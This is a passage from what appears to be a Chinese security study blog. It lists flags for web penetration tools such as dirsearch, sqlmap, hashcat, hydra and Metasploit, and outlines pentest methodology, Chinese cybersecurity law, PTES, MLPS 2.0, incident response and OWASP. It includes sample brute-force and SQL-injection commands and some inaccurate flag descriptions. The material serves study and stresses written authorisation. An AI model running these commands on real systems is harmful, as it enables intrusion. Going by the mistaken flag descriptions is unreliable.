<li><code>-r</code>：指定扫描的线程数</li>
<li><code>-b</code>：指定用户代理字符串</li>
<li><code>-F</code>：输出结果到指定的文件中</li>
<li><code>--plain-text-report</code>：生成简单的文本报告</li>
<li><code>--json-report</code>：生成JSON格式的报告</li>
<li><code>--exclude-status</code>：指定要排除的HTTP状态码</li>
</ul>
<p>例如，以下命令将使用默认字典扫描指定URL，并将扫描结果输出到名为”dirsearch.txt”的文件中：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://example.com/ -o dirsearch.txt</span><br></pre></td></tr></table></figure></div>

<h4 id="dirb（目录爆破枚举工具）"><a href="#dirb（目录爆破枚举工具）" class="headerlink" title="dirb（目录爆破枚举工具）"></a>dirb（目录爆破枚举工具）</h4><p>dirb是一个基于字典的web目录扫描工具，查找现有的（和&#x2F;或隐藏的）Web对象，通过对Web服务器发起基于字典的攻击并分析响应的数据。 采用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站，是在信息收集阶段获取目标信息常用工具手段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20230324155408795.png"
                      alt="image-20230324155408795"
                ></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://172.16.12.130          </span><br></pre></td></tr></table></figure></div>

<h4 id="dirbuster（目录爆破枚举工具）"><a href="#dirbuster（目录爆破枚举工具）" class="headerlink" title="dirbuster（目录爆破枚举工具）"></a>dirbuster（目录爆破枚举工具）</h4><table>
<thead>
<tr>
<th>-u</th>
<th>指定url</th>
</tr>
</thead>
<tbody><tr>
<td>-e</td>
<td>指定网站语言</td>
</tr>
<tr>
<td>-w</td>
<td>可以加上自己的字典（带上路径)</td>
</tr>
<tr>
<td>-r</td>
<td>递归爆破（查到一个目录后，在目录后再爆破)</td>
</tr>
</tbody></table>
<h4 id="Gobuster"><a href="#Gobuster" class="headerlink" title="Gobuster"></a>Gobuster</h4><p>GO语言编写的</p>
<p>Gobuster 是一个用于目录和文件爆破的开源工具</p>
<ul>
<li><code>-u</code>: 目标网站的 URL</li>
<li><code>-w</code>: 使用的字典文件路径</li>
<li><code>-e</code>: 对非 ASCII 字符进行编码</li>
<li><code>-s</code>: 设置状态码，可以指定多个状态码，用逗号分隔</li>
<li><code>-x</code>: 指定扩展名，多个扩展名用逗号分隔</li>
<li><code>-k</code>: 忽略 SSL 证书</li>
<li><code>-t</code>: 设置线程数</li>
<li><code>-r</code>: 遇到重定向时是否跟随</li>
<li><code>-a</code>: 显示所有状态码的结果</li>
<li><code>-n</code>: 不显示结果</li>
</ul>
<h2 id="4、数据库sql注入"><a href="#4、数据库sql注入" class="headerlink" title="4、数据库sql注入"></a>4、数据库sql注入</h2><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><p>SQLMap是一款常用的SQL注入工具，常用参数如下：</p>
<ol>
<li><code>-u</code>：指定目标URL，例如：<code>-u &quot;http://example.com/index.php?id=1&quot;</code></li>
<li><code>--dbs</code>：列出数据库信息。</li>
<li><code>-D</code>：指定数据库名称，例如：<code>-D dbname</code></li>
<li><code>-T</code>：指定表名称，例如：<code>-T tablename</code></li>
<li><code>-C</code>：指定列名称，例如：<code>-C columnname</code></li>
<li><code>--dump</code>：导出数据。</li>
<li><code>--level</code>：指定注入测试的等级，范围从1到5。</li>
<li><code>--risk</code>：指定注入测试的风险等级，范围从1到3。</li>
<li><code>--threads</code>：指定并发线程数。</li>
<li><code>--tamper</code>：指定字符编码，用于绕过一些防护措施。</li>
<li><code>--proxy</code>：指定代理服务器。</li>
<li><code>--os-shell</code>：获取目标系统的shell。</li>
<li><code>--priv-esc</code>：尝试提升权限。</li>
<li><code>--sql-shell</code>：获取目标系统的SQL Shell。</li>
<li><code>--time-sec</code>：指定SQL注入时的超时时间。</li>
</ol>
<h2 id="5、密码攻击"><a href="#5、密码攻击" class="headerlink" title="5、密码攻击"></a>5、密码攻击</h2><p>cewl、hashcat、john、medusa、hydra</p>
<h4 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://192.168.15.146/phpMyAdmin/    //爬取特定的网页生成密码</span><br><span class="line"></span><br><span class="line">cewl http://192.168.15.146/phpMyAdmin/ -w dict.txt    //保存为字典文件</span><br><span class="line"></span><br><span class="line">cewl http://192.168.15.146/phpMyAdmin/ -m 9    //生成特定长度的字典,生成长度大于等于9的字典</span><br><span class="line"></span><br><span class="line">cewl http://192.168.15.146/phpMyAdmin/ -n -e    //从网站中获取Email,使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典。</span><br><span class="line"></span><br><span class="line">cewl http://www.baidu.com -c      //计算网站字典中重复的单词数量，想要计算目标网站中某个词的重复出现次数，你可以使用-c选项来开启参数计算功能。cewl http://www.baidu.com -c</span><br><span class="line"></span><br><span class="line">cewl http://www.baidu.com -d 3      //增加爬取深度，默认的爬取深度为2。</span><br></pre></td></tr></table></figure></div>

<h4 id="Hashcat"><a href="#Hashcat" class="headerlink" title="Hashcat"></a>Hashcat</h4><p>Hashcat是一个用于破解密码的工具，它支持多种算法和格式的密码破解，包括MD5、SHA1、SHA256、SHA512等常见的密码算法。以下是Hashcat的一些常用参数：</p>
<ul>
<li><code>-m</code>: 指定要破解的密码哈希算法编号。例如，<code>-m 0</code>表示MD5算法，<code>-m 1000</code>表示NTLM算法。</li>
<li><code>-a</code>: 指定要使用的破解模式。例如，<code>-a 0</code>表示直接破解密码哈希，<code>-a 3</code>表示使用字典和规则进行破解。</li>
<li><code>-w</code>: 指定使用的工作负载配置。例如，<code>-w 3</code>表示使用高工作负载配置。</li>
<li><code>-r</code>: 指定使用的规则文件。例如，<code>-r myrules.rule</code>表示使用名为<code>myrules.rule</code>的规则文件进行破解。</li>
<li><code>-o</code>: 指定输出结果的文件名。例如，<code>-o cracked.txt</code>表示将破解结果输出到名为<code>cracked.txt</code>的文件中。</li>
<li><code>-D</code>: 列出可用的设备，并指定要使用的设备编号。例如，<code>-D 1</code>表示使用第二个GPU设备进行破解。</li>
</ul>
<h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>hydra是一款常用的网络登录爆破工具，可以用于暴力破解各种网络服务的登录密码，常见的参数如下：</p>
<ol>
<li><code>-l</code>：指定用户名或用户名文件</li>
<li><code>-P</code>：指定密码或密码文件</li>
<li><code>-t</code>：指定并发线程数</li>
<li><code>-w</code>：指定字典文件</li>
<li><code>-e</code>：指定密码枚举模式，例如e为smb，E为SMTP</li>
<li><code>-s</code>：指定服务名称，例如ssh、http、smtp等</li>
<li><code>-vV</code>：显示详细信息，包括版本号</li>
<li><code>-o</code>：将输出结果保存到文件中</li>
<li><code>-M</code>：指定目标地址文件</li>
<li><code>-f</code>：在尝试登录时禁用帐户锁定机制</li>
</ol>
<p>例如，以下是使用hydra进行ssh爆破的命令：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P passlist.txt ssh://192.168.0.1</span><br></pre></td></tr></table></figure></div>

<p>这个命令会使用用户名”admin”和密码字典”passlist.txt”进行SSH登录爆破。</p>
<h4 id="6、漏洞利用工具集"><a href="#6、漏洞利用工具集" class="headerlink" title="6、漏洞利用工具集"></a>6、漏洞利用工具集</h4><p>msf、searchsploit（漏洞查询）、sqlmap</p>
<h4 id="searchsploit（漏洞查询）"><a href="#searchsploit（漏洞查询）" class="headerlink" title="searchsploit（漏洞查询）"></a>searchsploit（漏洞查询）</h4><p>Searchsploit是一款用于搜索漏洞利用代码的命令行工具，它可以从本地exploitdb漏洞利用库中搜索特定漏洞的相关利用代码。以下是searchsploit的基本参数：</p>
<ul>
<li>-h：显示帮助信息；</li>
<li>-v：显示版本信息；</li>
<li>-w：显示完整路径；</li>
<li>-t：在标题中搜索；</li>
<li>-d：在描述中搜索；</li>
<li>-e：在漏洞编号中搜索；</li>
<li>-a：在作者中搜索；</li>
<li>-p：在路径中搜索；</li>
<li>-s：在源代码中搜索；</li>
<li>-u：更新exploitdb数据库；</li>
<li>-c：打开漏洞利用代码；</li>
<li>-x：打开漏洞利用代码，并在vim编辑器中显示；</li>
<li>-o：将漏洞利用代码保存到指定文件中；</li>
<li>-i：将漏洞利用代码导入Metasploit框架中；</li>
<li>-l：显示所有可用的漏洞利用代码；</li>
<li>-m:下载相关漏洞利用程序。</li>
</ul>
<h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><p>Metasploit（MSF）是一个免费的、可下载的框架</p>
<p>它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20230324165558920.png"
                      alt="image-20230324165558920"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/web%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/image-20230324165732300.png"
                      alt="image-20230324165732300"
                ></p>
<p>7、网络欺骗、网络嗅探</p>
<p>dnschef</p>
]]></content>
  </entry>
  <entry>
    <title>web渗透的步骤</title>
    <url>/2023/04/20/web%E6%B8%97%E9%80%8F%E7%9A%84%E6%AD%A5%E9%AA%A4/</url>
    <content><![CDATA[<h2 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h2><p>子域名、C段（同网段不同服务器）、旁注（同服务器不同站点）、目录探测、服务器端口、服务器脚本语言类型及版本、CMS识别、web中间件、web框架、数据库类型及版本、操作系统类型及版本。</p>
<h2 id="2、漏洞探测发现（手动-amp-自动）"><a href="#2、漏洞探测发现（手动-amp-自动）" class="headerlink" title="2、漏洞探测发现（手动&amp;自动）"></a>2、漏洞探测发现（手动&amp;自动）</h2><p><strong>手动</strong></p>
<p>去常见的地方去发现top10的漏洞，<strong>比如</strong>：搜索栏，login登录框、发表言论栏，修改信息的地方、与数据库交互的地方、URL地址、上传点等。</p>
<p><strong>自动</strong></p>
<p><strong>自动漏洞扫描工具</strong>：AWVS、APPScan、xray、yakit、goby、wpscan等，</p>
<p>发现中间件漏洞、框架漏洞、CMS漏洞、操作系统漏洞、端口漏洞等，去漏洞库（exploit-db、CVE漏洞库），网上寻找相应的POC进行验证。</p>
<h2 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h2><p>去网上查找对应的exp和payload进行利用，MSF、各种漏洞库、阿里云漏洞库、知道创宇漏洞库去进行查找利用，最后达到控制服务器的目的。</p>
]]></content>
  </entry>
  <entry>
    <title>Web渗透知识点</title>
    <url>/2023/04/19/%E6%80%BB%E7%BB%93%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<h2 id="一、网络安全法（17年颁布实施）"><a href="#一、网络安全法（17年颁布实施）" class="headerlink" title="一、网络安全法（17年颁布实施）"></a>一、网络安全法（17年颁布实施）</h2><p><strong>第二十七条</strong>：任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p>
<p><strong>第四十四条</strong>：任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p>
<p><strong>第六十四条 第二条款</strong> ：违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p>
<h2 id="二、PTES渗透流程"><a href="#二、PTES渗透流程" class="headerlink" title="二、PTES渗透流程"></a>二、PTES渗透流程</h2><h3 id="1、渗透测试-penetration-testing-pentest"><a href="#1、渗透测试-penetration-testing-pentest" class="headerlink" title="1、渗透测试 (penetration testing pentest)"></a>1、渗透测试 (penetration testing pentest)</h3><p>渗透测试（Penetration  Test）是指安全渗透测试者尽可能完整地以黑客的视角，模拟入侵识别目标网络&#x2F;系统&#x2F;主机&#x2F;应用的安全性作深入的探测，发现基础架构中不安全因素的评估方法，能够验证目标系统的技术安全性，快速发现当前最亟待解决的关键问题。通过修复漏洞，以领先攻击者的方式，帮助企业实现业务安全。</p>
<p><strong><u>渗透测试流程第一步是取得授权书，要 客户书面同意！！！</u></strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/image-20221202152110020.png"
                     
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/image-20221202151814319.png"
                     
                ></p>
<h3 id="2、渗透测试分类"><a href="#2、渗透测试分类" class="headerlink" title="2、渗透测试分类"></a>2、渗透测试分类</h3><h4 id="2-1、黑盒测试"><a href="#2-1、黑盒测试" class="headerlink" title="2.1、黑盒测试"></a>2.1、黑盒测试</h4><p>对客户组织一无所知</p>
<p>优点：对内部安全团队的检测与响应能力做出评估</p>
<p>缺点：费时费力，需要高技术</p>
<h4 id="2-2、白盒测试"><a href="#2-2、白盒测试" class="headerlink" title="2.2、白盒测试"></a>2.2、白盒测试</h4><p>对客户知道所有的流程，节约时间</p>
<p>优点：可以了解关于目标所有内部与底层知识，最小代价发现和验证系统最严重安全漏洞</p>
<p>不需要情报收集和目标定位，可以在部署和开发周期中进行集成</p>
<p>时间少代价低</p>
<p>缺点：无法测试内部应急响应能力，也无法判断出他们的安全防护计划对检测特定攻击的效率</p>
<h4 id="2-3、灰盒测试"><a href="#2-3、灰盒测试" class="headerlink" title="2.3、灰盒测试"></a>2.3、灰盒测试</h4><p>黑白组合可以提供对目标系统更加深入和全面审查</p>
<p>测试效果更好</p>
<h3 id="3、PTES渗透测试执行标准"><a href="#3、PTES渗透测试执行标准" class="headerlink" title="3、PTES渗透测试执行标准"></a><strong>3、PTES渗透测试执行标准</strong></h3><h4 id="3-1、前期交互阶段"><a href="#3-1、前期交互阶段" class="headerlink" title="3.1、前期交互阶段"></a><strong>3.1、前期交互阶段</strong></h4><p>测试团队与客户组织进行交互讨论确定测试范围，目标，限制条件以及服务合同细节</p>
<p>收集客户需求，准备测试计划，定义测试范围与边界，定义业务目标，项目管理与规划</p>
<h4 id="3-2、情报搜集阶段"><a href="#3-2、情报搜集阶段" class="headerlink" title="3.2、情报搜集阶段"></a><strong>3.2、情报搜集阶段</strong></h4><p>确定范围后，可以利用各种信息来源与收集技术方法，获取更多关于目标组织网络拓扑，系统配置与安全防御措施的信息。公开来源的信息查询，google 语法 ，社会工程学，网络踩点，扫描探测，被动监听，服务检查等。</p>
<h4 id="3-3、威胁建模阶段"><a href="#3-3、威胁建模阶段" class="headerlink" title="3.3、威胁建模阶段"></a><strong>3.3、威胁建模阶段</strong></h4><p>搜集到充分的情报信息之后，共同讨论获取的信息进行威胁建模与攻击规划，从中进行梳理，找出最可行的攻击通道。</p>
<h4 id="3-4、漏洞分析阶段"><a href="#3-4、漏洞分析阶段" class="headerlink" title="3.4、漏洞分析阶段"></a><strong>3.4、漏洞分析阶段</strong></h4><p>确定出最可行的攻击通道之后，考虑如何取得目标系统的访问控制权。需要综合分析前几个阶段获取并汇总的情报信息，找出攻击点，并在环境中进行验证。找出可被利用的未知安全漏洞，并开发渗透代码，从而打开攻击通道。</p>
<h4 id="3-5、渗透攻击阶段"><a href="#3-5、渗透攻击阶段" class="headerlink" title="3.5、渗透攻击阶段"></a><strong>3.5、渗透攻击阶段</strong></h4><p>利用找出的漏洞，真正入侵系统获得权限，黑盒测试中渗透测试者需要进行痕迹清理</p>
<h4 id="3-6、后渗透测试阶段"><a href="#3-6、后渗透测试阶段" class="headerlink" title="3.6、后渗透测试阶段"></a><strong>3.6、后渗透测试阶段</strong></h4><p>需要渗透测试团队根据目标组织的业务经营模式，保护资产形式与安全防御计划的不同特点，自主设计出攻击目标，识别关键基础设施，并寻找客户组织最具有价值和尝试安全保护的信息资产，最终达到能够对客户组织造成最重要业务影响的攻击途径。</p>
<h4 id="3-7、报告阶段"><a href="#3-7、报告阶段" class="headerlink" title="3.7、报告阶段"></a><strong>3.7、报告阶段</strong></h4><p>这份报告体现出渗透测试流程中所有的信息，包括渗透测试执行过程，还要站在防御者角度上，帮助他们分析安全防御体系中的薄弱环节，存在的问题，以及修补与升级技术方案</p>
<h3 id="4、安全生命周期"><a href="#4、安全生命周期" class="headerlink" title="4、安全生命周期:"></a>4、安全生命周期:</h3><p>1.安全漏洞研究与挖掘</p>
<p>2.渗透代码开发与测试</p>
<p>3.安全漏洞和渗透代码在封闭团队中流传</p>
<p>4.安全漏洞和渗透代码开始扩散</p>
<p>5.恶意程序出现并开始传播</p>
<p>6.渗透漏洞&#x2F;恶意程序大规模传播并危害互联网</p>
<p>7.渗透攻击代码&#x2F;攻击工具&#x2F;恶意程序逐渐消亡</p>
<h2 id="三、等级保护2-0、风险评估、漏洞扫描、应急响应、巡检"><a href="#三、等级保护2-0、风险评估、漏洞扫描、应急响应、巡检" class="headerlink" title="三、等级保护2.0、风险评估、漏洞扫描、应急响应、巡检"></a>三、等级保护2.0、风险评估、漏洞扫描、应急响应、巡检</h2><h4 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h4><p>等保2.0全称网络安全等级保护2.0制度，是我国网络安全领域的基本国策、基本制度。等级保护标准在1.0时代标准的基础上，注重主动防御，从被动防御到事前、事中、事后全流程的安全可信、动态感知和全面审计，实现了对传统信息系统、基础信息网络、云计算、大数据、物联网、移动互联网和工业控制信息系统等级保护对象的全覆盖。</p>
<p><strong>一个中心 三重防护</strong><br>一个中心即安全管理中心，三重防护即安全技术环境、安全区域边界、安全通信网络。</p>
<h4 id="2、五个级别"><a href="#2、五个级别" class="headerlink" title="2、五个级别"></a>2、五个级别</h4><p>第一级（自主保护级），等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益造成损害，但不损害国家安全、社会秩序和公共利益。</p>
<p>第二级（指导保护级），等级保护对象受到破坏后，会对公民、法人和其他组织的合法权益产生严重损害，或者对社会秩序 和公共利益造成损害，但不损害国家安全。</p>
<p>第三级（监督保护级），等级保护对象受到破坏后，会对社会秩序和公共利益造成严重损害，或者对国家安全造成损害。</p>
<p>第四级（强制保护级），等级保护对象受到破坏后，会对社会秩序和公共利益造成特别严重损害，或者对国家安全造成严重损害。</p>
<p>第五级（专控保护级），等级保护对象受到破坏后，会对国家安全造成特别严重损害。</p>
<h4 id="3、五个规定动作"><a href="#3、五个规定动作" class="headerlink" title="3、五个规定动作"></a>3、五个规定动作</h4><p>规定动作分别为：定级、备案、建设整改、等级测评、监督检查。</p>
<h4 id="4、等级保护的主体职责"><a href="#4、等级保护的主体职责" class="headerlink" title="4、等级保护的主体职责"></a>4、等级保护的主体职责</h4><p>网络公安对定级对象的备案受理及监督检查职责、第三方测评机构对定级对象的安全评估职责、上级主管单位对所属单位的安全管理职责、运营使用单位对定级对象的等级保护职责。</p>
<h4 id="5、相关处罚措施有"><a href="#5、相关处罚措施有" class="headerlink" title="5、相关处罚措施有:"></a><strong>5、相关处罚措施有:</strong></h4><p>《网络安全法》第五十九条规定：</p>
<p><strong>网络运营</strong>不履行义务的：由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p>
<p><strong>关键信息基础设施的运营者</strong>不履行义务的 ：由有关主管部门责令改正，给予警告； 拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p>
<p>划重点：用户单位不做等级保护测评，用户单位需要被罚款<strong>1万-100万</strong>；主管人员需要被罚款<strong>5000-100000</strong>。</p>
<h4 id="6、风险评估"><a href="#6、风险评估" class="headerlink" title="6、风险评估"></a>6、风险评估</h4><p>风险评估（Risk Assessment）是指对某种风险进行识别、分析和评估的过程。在信息安全领域，风险评估是一种评估组织信息系统面临的威胁和漏洞的方法。它有助于确定哪些风险是最重要的、最紧迫的和最值得关注的，以及确定减轻这些风险所需的措施和成本。</p>
<p>风险评估通常包括以下步骤：</p>
<ol>
<li>风险识别：确定潜在的安全威胁和漏洞，包括网络威胁、系统漏洞、恶意软件、自然灾害等。</li>
<li>风险分析：分析已识别的风险的概率、影响和严重程度。</li>
<li>风险评估：根据风险分析的结果，对风险进行评估，以确定哪些风险是最重要、最紧迫的和最值得关注的。</li>
<li>风险管理：确定减轻风险的措施和成本，包括措施的优先级和时间表。</li>
</ol>
<p>风险评估可以帮助组织建立健全的信息安全控制框架，确保信息系统和数据得到充分的保护，同时最小化可能的损失和风险。</p>
<p><strong>风险评估级别</strong></p>
<p>低风险：指风险发生的概率较小，且一旦发生，对个人或组织的影响也较小。</p>
<p>中风险：指风险发生的概率较高，或者一旦发生，对个人或组织的影响较大。</p>
<p>高风险：指风险发生的概率非常高，或者一旦发生，对个人或组织的影响非常严重，甚至可能导致重大损失或灾难性后果。</p>
<p><strong>风险评估的要素</strong></p>
<p>网络安全风险评估涉及<strong>资产、威胁、脆弱性、安全措施、风险</strong></p>
<h4 id="7、漏洞扫描"><a href="#7、漏洞扫描" class="headerlink" title="7、漏洞扫描"></a>7、漏洞扫描</h4><h4 id="什么是漏洞扫描"><a href="#什么是漏洞扫描" class="headerlink" title="什么是漏洞扫描"></a>什么是漏洞扫描</h4><p>漏洞扫描是一种技术手段，可以发现目标系统存在的漏洞，还可以进一步利用发现的漏洞干一些自己一直想干但之前确干不了的事情，比如渗透测试。它就像一个灵活的特种兵，有自己的弹药库，并且可以基于弹药库（它有自己的名字：漏洞数据库）配合发射器（这里指的是各种漏扫手段），对指定目标（操作系统，包括系统上面的服务）进行狂轰乱炸，从而判断出目标的安全系数。</p>
<p><strong>定义：</strong></p>
<p>漏洞扫描（Vulnerability Scanning）是指使用专门的软件工具对计算机系统、应用程序、网络设备等进行安全性扫描，以识别已知的漏洞、弱点或配置错误。漏洞扫描可以帮助企业和组织发现其信息系统中的安全问题，及时修复漏洞以保护其信息资产。</p>
<p>漏洞扫描可以自动化地扫描系统和应用程序中的漏洞，识别已知漏洞并提供详细的报告。漏洞扫描工具通常使用已知的漏洞库来检测目标系统中可能存在的漏洞。漏洞库是包含各种已知漏洞的数据库，通常由漏洞厂商、安全研究人员和社区维护更新。</p>
<p>漏洞扫描可以帮助组织及时发现已知漏洞并采取措施修复，减少被攻击的风险。同时，漏洞扫描也是合规性检查的重要手段，一些安全标准和法规要求组织对其信息系统进行定期漏洞扫描，并采取必要的措施修复发现的漏洞。</p>
<p><strong>漏洞扫描的基本流程：</strong></p>
<ol>
<li>信息搜集：获取要扫描的目标信息，包括IP地址、域名、子域名、Web应用程序URL等。</li>
<li>主机扫描：对目标主机进行端口扫描，确定主机开放的服务、应用程序、操作系统等信息。</li>
<li>漏洞扫描：使用漏洞扫描工具对目标主机或Web应用程序进行扫描，识别已知漏洞、弱点或配置错误。</li>
<li>漏洞验证：对扫描结果中的漏洞进行验证，确认其是否真实存在。</li>
<li>报告生成：生成漏洞扫描报告，包括发现的漏洞、风险评估、建议的修复措施等信息。</li>
</ol>
<p>需要注意的是，漏洞扫描只是信息安全测试的一部分，它只能识别已知漏洞，不能发现未知漏洞。因此，对于敏感和关键系统，需要使用更加全面和深入的渗透测试方法来发现未知漏洞。</p>
<p>第一步-探测主机：确认攻击目标是否在线。（可以理解为对方是否在家）<br>第二步-扫描端口：获取目标的信息，如开放端口号、对外提供的服务名称、使用版本、操作系统类型等（可以理解为对方家有几个窗户几个门）<br>第三步-漏洞攻击：根据扫描端口获取的信息，使用漏洞模块，针对性的进行攻击，从而判断是否存在漏洞（可以理解为是撬门锁比较好，还是跳窗户比较好）</p>
<h4 id="8、应急响应"><a href="#8、应急响应" class="headerlink" title="8、应急响应"></a>8、应急响应</h4><p>信息安全的应急响应流程一般包括以下步骤：</p>
<p>1、信息采集和分析：对安全事件的相关信息进行收集、收集客户信息和中毒主机信息，包括样本，还有事件的类型、来源、影响、传播路径等信息。</p>
<p>2、应急处理：针对安全事件，采取相应的措施，断网，隔离缺陷主机，防止事件继续扩散和损失进一步加剧。</p>
<p>3、判断类型：判断是何种安全事件，勒索、挖矿、木马、被暴力破解密码等等。</p>
<p>4、深入分析：日志分析、进程分析、样本分析，分析出相关安全事件所利用的漏洞。</p>
<p>5、事件处置和恢复：直接杀掉进程，删除文件，打补丁，抑或是修复文件，对受影响的系统、网络和设备等进行修复和恢复，确保业务正常运行。</p>
<p>6、事后总结和归档：对应急响应过程进行总结和归档，分析应急响应的效果和不足，以便于对应急响应流程和措施的完善和改进。</p>
<p><strong>应急响应的级别</strong><br>分别是Ⅰ级（特别严重）、Ⅱ级（严重）、Ⅲ级（较重）和Ⅳ级（一般），其对应颜色分别为红色、橙色、黄色和蓝色。<br>应急响应事件根据其紧急程度和影响程度可以分为以下几个级别：</p>
<p>级别一（最高级别）：表示非常紧急的事件，可能会对整个组织的业务连续性和稳定性造成严重影响，需要立即启动应急响应计划，并迅速组织应急响应小组进行处置。</p>
<p>级别二：表示紧急事件，需要及时启动应急响应计划，尽快组织应急响应小组进行处置，并保证业务的持续性和稳定性。</p>
<p>级别三：表示中等紧急程度的事件，需要启动应急响应计划，并迅速组织应急响应小组进行处置，以最大程度地减少事件对业务的影响。</p>
<p>级别四：表示较低紧急程度的事件，需要启动应急响应计划，并组织应急响应小组进行处置，以保证业务的正常运行和安全性。</p>
<p>在实际应急响应工作中，根据具体情况和组织内部的要求，可能还会根据需要制定其他级别的事件分类。无论是哪种级别的事件，都需要有一个完善的应急响应计划，并组织专业的应急响应小组进行处置，以最大程度地保障业务的安全和稳定。</p>
<p><strong>面试题</strong></p>
<p>如果⼀台服务器被⼊侵后, 你会如何做应急响应? </p>
<ol>
<li>准备相关的⼯具，查后⻔等⼯具</li>
<li>初步判断事件类型, 事件等级。</li>
<li>抑制范围，隔离使受害⾯不继续扩⼤ </li>
<li>查找原因，封堵攻击源。</li>
<li>业务恢复正常⽔平. </li>
<li>总结，报告，并修复、监控</li>
</ol>
<h4 id="9、安全巡检"><a href="#9、安全巡检" class="headerlink" title="9、安全巡检"></a>9、安全巡检</h4><p>信息安全巡检的主要目标包括以下几点：</p>
<p>发现安全漏洞：通过对信息系统的扫描和检测，发现可能存在的安全漏洞和弱点，及时采取补救措施，提高信息系统的安全性。</p>
<p>检查系统配置：检查组织信息系统的硬件、软件、网络等各种配置是否符合安全标准，是否存在不安全因素，及时进行调整和升级。</p>
<p>检查安全策略：检查组织的安全策略和安全规范是否得到有效实施，是否存在不合理的安全规定和漏洞，及时修复和完善安全策略。</p>
<p>检查安全意识：检查组织内部员工的安全意识和安全教育情况，是否得到充分的培训和普及，是否存在安全漏洞和管理不当的情况。</p>
<p>检查日志管理：检查信息系统的日志管理和审计机制是否完善，是否存在日志遗漏和篡改的情况，及时加强日志管理和监控。</p>
<h2 id="四、OWASP-TOP10"><a href="#四、OWASP-TOP10" class="headerlink" title="四、OWASP TOP10"></a>四、OWASP TOP10</h2><p>OWASP Top 10 是由开放 Web 应用程序安全项目 (OWASP) 建立的，该项目是一个非营利组织，可免费提供有关 Web 应用程序安全的文章和其他信息。</p>
<h3 id="1、什么是OWASP"><a href="#1、什么是OWASP" class="headerlink" title="1、什么是OWASP"></a><strong>1、什么是OWASP</strong></h3><p>在 [开放Web应用基金会]致力于创造一个更安全的网络应用环境。它免费提供文章、工具、技术和论坛，让每个开发人员都能创建安全的代码。其最著名的项目之一是 OWASP Top 10。</p>
<h3 id="2、OWASP-TOP10"><a href="#2、OWASP-TOP10" class="headerlink" title="2、OWASP TOP10"></a>2、OWASP TOP10</h3><p>OWASP Top 10是根据开放 Web 应用程序安全项目公开共享的 10 个最关键的 Web 应用程序安全漏洞列表。根据 OWASP，漏洞是应用程序中的一个弱点，它允许恶意方对应用程序的利益相关者（所有者、用户等）造成伤害。</p>
<h3 id="3、top-10漏洞"><a href="#3、top-10漏洞" class="headerlink" title="3、top 10漏洞"></a>3、top 10漏洞</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/%E6%80%BB%E7%BB%93%E7%9F%A5%E8%AF%86%E7%82%B9/1.png"
                     
                ></p>
<h2 id="五、各种漏洞"><a href="#五、各种漏洞" class="headerlink" title="五、各种漏洞"></a>五、各种漏洞</h2><h3 id="web渗透思路："><a href="#web渗透思路：" class="headerlink" title="web渗透思路："></a><strong>web渗透思路：</strong></h3><p>给出一个IP地址后，进行Web渗透测试的思路可能包括以下几个步骤：</p>
<ol>
<li><p>信息收集：了解目标IP地址的背景信息，包括网络拓扑结构、Web应用程序框架、操作系统、开放端口等。可以使用工具如nmap和whois来获取相关信息。</p>
<p> a、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录</p>
<p> b、whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等）</p>
<p> c、⼦域名收集，旁站，C 段等</p>
</li>
